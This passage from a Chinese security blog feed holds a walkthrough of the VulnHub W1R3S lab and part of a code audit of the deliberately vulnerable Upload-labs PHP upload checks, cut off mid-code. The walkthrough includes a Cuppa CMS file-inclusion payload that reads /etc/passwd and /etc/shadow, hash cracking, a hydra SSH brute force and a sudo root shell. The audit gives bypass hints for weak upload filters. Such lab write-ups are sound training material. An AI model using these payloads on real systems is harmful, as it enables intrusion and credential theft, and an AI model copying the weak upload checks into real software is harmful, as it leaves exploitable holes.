    <link href="/2024/04/23/%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6W1R3S%E6%89%93%E9%9D%B6%E6%80%9D%E8%B7%AF/"/>
    <url>/2024/04/23/%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6W1R3S%E6%89%93%E9%9D%B6%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<p>​<strong>靶机地址：<a href="https://download.vulnhub.com/w1r3s/w1r3s.v1.0.1.zip">https://download.vulnhub.com/w1r3s/w1r3s.v1.0.1.zip</a></strong></p><p>#用tmux分屏命令行 tmux split-window 划分上下两个窗口 tmux split-window -h 划分左右两个窗口</p><p>#窗口的移动为 ctrl+b+方向键</p><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现:"></a>主机发现:</h2><p>将靶机在本地vm开启</p><p>kali里面得到虚拟机ip，扫描整个c段</p><p><code>sudo nmap -sn 192.168.80.128/24</code></p><p><code>-sn参数 只做ping扫描，不做端口扫描</code></p><p>使用对比方法，没开靶机之前扫一次，开启靶机后再扫一次，多出来的地址就是我们需要的靶机的地址。</p><p><img src="/images/w1r3s/1.png"></p><p>得到靶机地址为192.168.80.182</p><h2 id="端口扫描："><a href="#端口扫描：" class="headerlink" title="端口扫描："></a>端口扫描：</h2><p><code>sudo nmap -min-rate 10000 192.168.80.182</code></p><p><code>-min-rate 为每次扫描至少等待的时间，单位为毫秒</code></p><p><img src="/images/w1r3s/2.png"></p><p>得到四个开放的端口，分别是21&#x2F;tcp ftp，22&#x2F;tcp ssh，80&#x2F;tcp http，3306&#x2F;tcp mysql</p><p>接着进一步扫描这几个端口</p><p><code>sudo nmap sT sV -sC -O p21,22,80,3306 192.168.80.182</code></p><p><code>-sT参数 指定以TCP协议进行扫描 -sV参数 探测各服务的版本 -sC参数 用默认脚本进行扫描  -O探测操作系统版本 -p指定端口</code></p><p><img src="/images/w1r3s/3.png"></p><p>可以看到ftp允许匿名登录，且给了我们三个文件夹，又可能有信息泄露，优先查看</p><p>ssh一般不优先考虑，80权重最重</p><p>查看各个端口的端口的可能可利用漏洞</p><p><code>sudo nmap --script=vuln -p21,80,22,3306 192.168.80.182</code></p><p><code>使用--script=vuln 可以扫描网站常见漏洞以及网页的目录结构</code></p><p><img src="/images/w1r3s/5.png"></p><p>可以看到有DOS和一个Wordpress，DOS可以不考虑，Wordpress留意一下</p><p>我们还可以执行UDP扫描</p><p><code>sudo nmap -sU --top-ports 20 192.168.80.182</code></p><p><code>-sU表示UDP扫描 --top-ports 20 表示对top20的端口进行扫描</code></p><p><img src="/images/w1r3s/4.png"></p><p>看到前二十个端口都是开放或者被过滤状态，无明确开放端口，可以暂时不考虑</p><h2 id="FTP渗透："><a href="#FTP渗透：" class="headerlink" title="FTP渗透："></a>FTP渗透：</h2><p>测试FTP服务</p><p><code>ftp 192.168.80.182</code></p><p><img src="/images/w1r3s/6.png"></p><p>name为anonymous  password为空</p><p>用binary指令使下载的文件可读</p><p>ls可以看到有三个文件夹，把这些文件全部下载下来</p><p>先进入content 输入mget *.txt</p><p><img src="/images/w1r3s/7.png"></p><p>退出conten文件夹并进入第二个文件夹，下载文件</p><p><img src="/images/w1r3s/8.png"></p><p>下载第三个文件夹内容</p><p><img src="/images/w1r3s/9.png"></p><p>没有其他内容则quit退出</p><p>读取所有下载下来的文件内容</p><p><code>cat *.txt</code></p><p><img src="/images/w1r3s/10.png"></p><p>第一句话为w1r3s公司的新的ftp服务</p><p>第二句话<code>01ec2d8fc11c493b25029fb1f47f39ce</code>可以去网上搜索，大概率是MD5</p><p><a href="http://hashes.com/">http://hashes.com</a>  可以解MD5</p><p><img src="/images/w1r3s/11.png"></p><p>看起来没什么用</p><p>下一串<code>SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==</code>一眼应该是base-64</p><p>用kali解码base64</p><p><code>echo &quot;SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==&quot; | base64 -d</code></p><p><code>It is easy, but not that easy.. </code></p><p>看起来也没什么用</p><p>接下来是员工列表</p><p><code>Naomi.W - Manager Hector.A - IT Dept Joseph.G - Web Design Albert.O - Web Design Gina.L - Inventory Rico.D - Human Resources   </code></p><p>可能有用特别是前两个</p><p>最后两句话翻转了</p><p>借助网络工具 <a href="https://www.upsidedowntext.com/">Upside Down Text | Flip Text, Type Upside Down, or Backwards Text</a></p><p>对两句话进行正常转化</p><p><code>ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡</code></p><p><code>ı don&#39;t thınk thıs ıs the way to root!</code></p><p><code>....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ</code></p><p><code>we have a ןot of work to do‘ stop pןayıng around˙˙˙˙</code></p><p>看起来也没啥用</p><p><strong>综合起来FTP没有特别大的信息</strong></p><h2 id="Mysql试探："><a href="#Mysql试探：" class="headerlink" title="Mysql试探："></a>Mysql试探：</h2><p>尝试链接mysql服务</p><p><code>mysql -h 192.168.80.182 -u root -p</code></p><p><img src="/images/w1r3s/12.png"></p><p>随便输入一个密码，被告知不允许接入Mysql服务</p><p><strong>Mysql没有什么说法</strong></p><h2 id="Web渗透："><a href="#Web渗透：" class="headerlink" title="Web渗透："></a>Web渗透：</h2><p>打开浏览器查看web服务</p><p><img src="/images/w1r3s/13.png"></p><p>可以看到是apache服务，查看源码也是没有什么有价值的信息</p><p>扫一下目录</p><p><code>sudo gobuster dir -u http://192.168.80.182 --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</code></p><p><code>--wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt为kali里面自带的字典</code></p><p><img src="/images/w1r3s/14.png"></p><p>只有<code>http://192.168.80.182/administrator/</code>可以进入</p><p>该页面是cuppa CMS内容管理系统的安装界面</p><p><img src="/images/w1r3s/15.png"></p><p>在渗透测试时此交互状态的进行必须谨慎，考虑会不会影响服务器环境，可能会造成不可逆后果。</p><p>一路next</p><p><img src="/images/w1r3s/16.png"></p><p>管理员用户创建失败</p><p>查看源码并没有信息泄露，看不出版本信息</p><p>我们试着搜索cuppa cms存在的漏洞</p><p><code>searchsploit cuppa cms</code><br><img src="/images/w1r3s/17.png"></p><p>得到一条，下载此文件</p><p><code>searchsploit cuppa -m 25971</code></p><p>读取此文件</p><p><img src="/images/w1r3s/18.png"></p><p>exp有两条，一个包含远程文件，一个包含本地文件</p><p>可以试试包含本地文件</p><p><code>http://192.168.80.182/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</code></p><p>并没有此页面</p><p>我们可以猜测不是在cuppa目录下，而是administrator目录下</p><p><img src="/images/w1r3s/19.png"></p><p>有反应但是没有读取出数据</p><p>可能是传参的问题</p><p>去github官网的cuppa cms查看源代码可以发现参数是post传递的</p><p><img src="/images/w1r3s/20.png"></p><p>通过命令行工具构造payload</p><p><code>curl --data-urlencode &#39;urlConfig=../../../../../../../../../etc/passwd&#39; http://192.168.80.182/administrator/alerts/alertConfigField.php</code></p><p><img src="/images/w1r3s/21.png"></p><p>已经列出了passwd的内容，且密码都是x，说明密码是以hash的方式存在shadow文件中</p><p>尝试读取&#x2F;shadow的内容</p><p><img src="/images/w1r3s/22.png"></p><p>www-data root w1r3 都有hash值</p><p>将密码存到shadow.hash中用john破解</p><p><img src="/images/w1r3s/23.png"></p><p>破解出其中两个密码</p><p><img src="/images/w1r3s/26.png"></p><p>试着登录w1r3s用户</p><p><img src="/images/w1r3s/24.png"></p><p>登陆成功</p><p>试试常用指令，并查询当前用户的权限</p><p><img src="/images/w1r3s/25.png"></p><p>拥有全部权限</p><h2 id="提权："><a href="#提权：" class="headerlink" title="提权："></a>提权：</h2><p>有所有权限就很好提权</p><p><code>sudo /bin/bash</code></p><p><img src="/images/w1r3s/27.png"></p><p>打开目录下的flag.txt</p><p><img src="/images/w1r3s/28.png"></p><p>完成挑战</p><h2 id="彩蛋："><a href="#彩蛋：" class="headerlink" title="彩蛋："></a>彩蛋：</h2><p>一般来说不会考虑22端口，但是这个靶机我们可以暴力破解ssh</p><p>先构造用户名</p><p><code>vim user.list</code>  w1r3s root admin</p><p><code>hydra -L user.list -P /usr/share/wordlists/rockyou.txt ssh://192.168.80.182 -t 4</code></p><p><img src="/images/w1r3s/29.png"></p><p>如果没有字典则需要像我一样解压</p><p>最后爆出来了w1r3s的密码，接下来和前面一样操作即可拿到flag.</p>]]></content>
    
    
    <categories>
      
      <category>红队打靶</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Upload-labs分析</title>
    <link href="/2024/04/02/Upload-labs-passCode_source/"/>
    <url>/2024/04/02/Upload-labs-passCode_source/</url>
    
    <content type="html"><![CDATA[<h1 id="Upload-labs代码审计"><a href="#Upload-labs代码审计" class="headerlink" title="Upload-labs代码审计"></a>Upload-labs代码审计</h1><h4 id="Upload-labs-pass01-‘JS禁用’"><a href="#Upload-labs-pass01-‘JS禁用’" class="headerlink" title="Upload-labs-pass01: ‘JS禁用’"></a>Upload-labs-pass01: ‘JS禁用’</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkFile</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> file = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&#x27;upload_file&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>;<br>    <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">null</span> || file == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;请选择要上传的文件!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">//定义允许上传的文件类型</span><br>    <span class="hljs-keyword">var</span> allow_ext = <span class="hljs-string">&quot;.jpg|.png|.gif&quot;</span>;<br>    <span class="hljs-comment">//提取上传文件的类型</span><br>    <span class="hljs-keyword">var</span> ext_name = file.<span class="hljs-title function_">substring</span>(file.<span class="hljs-title function_">lastIndexOf</span>(<span class="hljs-string">&quot;.&quot;</span>));<br>    <span class="hljs-comment">//判断上传文件类型是否允许上传</span><br>    <span class="hljs-keyword">if</span> (allow_ext.<span class="hljs-title function_">indexOf</span>(ext_name + <span class="hljs-string">&quot;|&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">var</span> errMsg = <span class="hljs-string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="hljs-string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;<br>        <span class="hljs-title function_">alert</span>(errMsg);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//不必多言，直接在浏览器中对JS进行禁用即可。</span><br></code></pre></td></tr></table></figure><h4 id="Upload-labs-pass02-‘MIME类型绕过’"><a href="#Upload-labs-pass02-‘MIME类型绕过’" class="headerlink" title="Upload-labs-pass02: ‘MIME类型绕过’"></a><strong>Upload-labs-pass02</strong>: ‘MIME类型绕过’</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]            <br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//isset(mixed $var, mixed ...$vars): bool</span><br><span class="hljs-comment">/* 判断一个变量是否已设置, 即变量已被声明，且其值不为 null。 </span><br><span class="hljs-comment"> 如果一个变量已经被使用 unset() 释放，它将不再被认为已设置。 </span><br><span class="hljs-comment"> 若使用 isset() 测试一个被赋值为 null 的变量，将返回 false。同时要注意的是 null 字符（&quot;\0&quot;）并不等同  于 PHP 的 null 常量。 </span><br><span class="hljs-comment"> 如果一次传入多个参数，那么 isset() 只有在全部参数都已被设置时返回 true。 计算过程从左至右，中途遇到未设  置的变量时就会立即停止。</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">//file_exists(string $filename): bool</span><br><span class="hljs-comment">/*检查文件或目录是否存在。*/</span><br><br><br></code></pre></td></tr></table></figure><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><h4 id="Upload-labs-pass03-‘黑名单不全导致的绕过’"><a href="#Upload-labs-pass03-‘黑名单不全导致的绕过’" class="headerlink" title="Upload-labs-pass03: ‘黑名单不全导致的绕过’"></a>Upload-labs-pass03: ‘黑名单不全导致的绕过’</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);<span class="hljs-comment">//黑名单不全，考虑使用其他的后缀绕过即可，如&#x27;.phtml&#x27;等</span><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<span class="hljs-comment">//去除字符串首尾处的空白字符</span><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<span class="hljs-comment">//取得文件后缀</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<span class="hljs-comment">//重命名文件            </span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                 <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//trim(string $string, string $characters = &quot; \n\r\t\v\x00&quot;): string</span><br><span class="hljs-comment">/*去除字符串首尾处的空白字符（或者其他字符）</span><br><span class="hljs-comment"> 此函数返回字符串 string 去除首尾空白字符后的结果。如果不指定第二个参数，trim() 将去除这些字符： </span><br><span class="hljs-comment">◦ &quot; &quot; (ASCII 32 (0x20))，普通空格符。  </span><br><span class="hljs-comment">◦ &quot;\t&quot; (ASCII 9 (0x09))，制表符。  </span><br><span class="hljs-comment">◦ &quot;\n&quot; (ASCII 10 (0x0A))，换行符。  </span><br><span class="hljs-comment">◦ &quot;\r&quot; (ASCII 13 (0x0D))，回车符。  </span><br><span class="hljs-comment">◦ &quot;\0&quot; (ASCII 0 (0x00))，空字节符。  </span><br><span class="hljs-comment">◦ &quot;\v&quot; (ASCII 11 (0x0B))，垂直制表符。*/</span><br><br><span class="hljs-comment">//strrchr(string $haystack, string $needle): string|false</span><br><span class="hljs-comment">/*查找指定字符在字符串中的最后一次出现</span><br><span class="hljs-comment">  该函数返回 haystack 字符串中的一部分，这部分以 needle 的最后出现位置开始，直到 haystack 末尾。 */</span><br><br><span class="hljs-comment">//strtolower(string $string): string</span><br><span class="hljs-comment">/*将字符串转化为小写</span><br><span class="hljs-comment"> 将 string 中所有的 ASCII 字母字符转换为小写并返回。&quot;A&quot;（0x41）到 &quot;Z&quot;（0x5a）范围内的字节会通过将每个字节值加 32 转为相应的小写字母。 </span><br><span class="hljs-comment"> 这可用于转换用 UTF-8 编码的字符串中的 ASCII 字符，但会忽略多字节 UTF-8 字符。要转换多字节非 ASCII 字符，请使用 mb_strtolower()。 */</span><br><br><span class="hljs-comment">//str_ireplace(array|string $search,array|string $replace,string|array $subject,int &amp;$count = null): string|array</span><br><span class="hljs-comment">/*该函数返回字符串或者数组。该字符串或数组是将 subject 中全部的 search 都被 replace 替换（忽略大小写）之后的结果。 */</span><br>    <br><span class="hljs-comment">//move_uploaded_file(string $from, string $to): bool</span><br><span class="hljs-comment">/*本函数检查并确保由 from 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 to 指定的文件。*/</span><br><br><span class="hljs-comment">//in_array(mixed $needle, array $haystack, bool $strict = false): bool</span><br><span class="hljs-comment">/*检查数组中是否存在某个值.</span><br><span class="hljs-comment">  如果第三个参数 strict 的值为 true 则 in_array() 函数还会检查 needle 的类型是否和 haystack 中的相同。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">//date(string $format, ?int $timestamp = null): string</span><br><span class="hljs-comment">/*使用指定整数 timestamp（Unix 时间戳），或者使用当前时间（如果没有指定时间戳），返回相应的指定格式的格式化字符串。换句话说，timestamp 是可选的，默认值是 time()。</span><br><span class="hljs-comment"> 使用示例：</span><br><span class="hljs-comment">&lt;?php</span><br><span class="hljs-comment">// 假设今天是 2001 年 3 月 10 日下午 5 点 16 分 18 秒，</span><br><span class="hljs-comment">// 并且位于山区标准时间（MST）时区</span><br><span class="hljs-comment">$today = date(&quot;F j, Y, g:i a&quot;);                 // March 10, 2001, 5:16 pm</span><br><span class="hljs-comment">$today = date(&quot;m.d.y&quot;);                         // 03.10.01</span><br><span class="hljs-comment">$today = date(&quot;j, n, Y&quot;);                       // 10, 3, 2001</span><br><span class="hljs-comment">$today = date(&quot;Ymd&quot;);                           // 20010310</span><br><span class="hljs-comment">$today = date(&#x27;h-i-s, j-m-y, it is w Day&#x27;);     // 05-16-18, 10-03-01, 1631 1618 6 Satpm01</span><br><span class="hljs-comment">$today = date(&#x27;\i\t \i\s \t\h\e jS \d\a\y.&#x27;);   // it is the 10th day.</span><br><span class="hljs-comment">$today = date(&quot;D M j G:i:s T Y&quot;);               // Sat Mar 10 17:16:18 MST 2001</span><br><span class="hljs-comment">$today = date(&#x27;H:m:s \m \i\s\ \m\o\n\t\h&#x27;);     // 17:03:18 m is month</span><br><span class="hljs-comment">$today = date(&quot;H:i:s&quot;);                         // 17:16:18</span><br><span class="hljs-comment">$today = date(&quot;Y-m-d H:i:s&quot;);                   // 2001-03-10 17:16:18（MySQL DATETIME 格式）</span><br><span class="hljs-comment">?&gt; */</span><br><br><span class="hljs-comment">//rand(int $min, int $max): int</span><br><span class="hljs-comment">/*如果没有提供可选参数 min 和 max 调用 rand() 会返回 0 到 getrandmax() 之间的伪随机整数。例如想要 5 到 15（包括 5 和 15）之间的随机数，用 rand(5, 15)。</span><br></code></pre></td></tr></table></figure><h4 id="Upload-labs-pass04-‘-htaccess配置文件绕过’"><a href="#Upload-labs-pass04-‘-htaccess配置文件绕过’" class="headerlink" title="Upload-labs-pass04: ‘.htaccess配置文件绕过’"></a>Upload-labs-pass04: ‘.htaccess配置文件绕过’</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span 